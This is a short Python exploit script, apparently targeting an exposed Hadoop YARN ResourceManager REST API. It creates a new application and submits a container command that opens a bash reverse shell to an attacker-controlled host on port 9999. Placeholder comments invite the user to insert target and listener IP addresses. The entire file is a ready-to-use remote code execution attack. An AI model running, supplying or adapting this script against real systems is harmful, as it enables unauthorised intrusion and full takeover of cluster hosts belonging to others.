import requests

#python3 
target = 'http://192.168.178.128:8088/'  # put your remote host IP here
lhost = '192.168.178.129'  # put your local host IP here

url = target + 'ws/v1/cluster/apps/new-application'
resp = requests.post(url)
print(resp.text)
app_id = resp.json()['application-id']
url = target + 'ws/v1/cluster/apps'
data = {
    'application-id': app_id,
    'application-name': 'get-shell',
    'am-container-spec': {
        'commands': {
            'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,
        },
    },
    'application-type': 'YARN',
}
print (data)
requests.post(url, json=data)